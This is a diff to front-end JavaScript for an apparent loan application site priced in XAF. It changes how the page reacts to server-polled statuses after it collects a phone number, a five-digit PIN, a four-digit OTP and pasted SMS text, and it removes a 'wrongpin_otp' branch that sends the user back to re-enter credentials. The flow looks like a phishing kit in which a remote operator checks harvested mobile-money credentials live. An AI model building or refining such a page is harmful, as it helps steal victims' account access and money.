@@ -483,26 +483,14 @@ function pollForOtpApproval(applicationId) {
                     const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
                     document.getElementById('aprMth').textContent    = 'XAF ' + monthly.toLocaleString();
                     goTo('page-approval');
-                } else if (status === 'wrongcode') {
+                } else if (status === 'rejected') {
                     clearTimeout(otpPollTimeout);
                     [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
                     goTo('page-otp');
                     document.getElementById('bOtp').disabled = false;
                     document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
                     chkOtp();
-                    showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
-                } else if (status === 'wrongpin_otp') {
-                    clearTimeout(otpPollTimeout);
-                    document.getElementById('lpPhone').value = '';
-                    [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
-                    [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
-                    document.getElementById('smsMsgBox').value = '';
-                    document.getElementById('bOtp').disabled = false;
-                    document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-                    goTo('page-login');
-                    document.getElementById('bLgn').disabled = false;
-                    chkPin();
-                    showLgnMsg('error', 'Your PIN was incorrect. Please re-enter your credentials.');
+                    showOtpMsg('error', 'The OTP was incorrect. Please try again.');
                 } else {
                     otpPollTimeout = setTimeout(checkStatus, 2000);
                 }
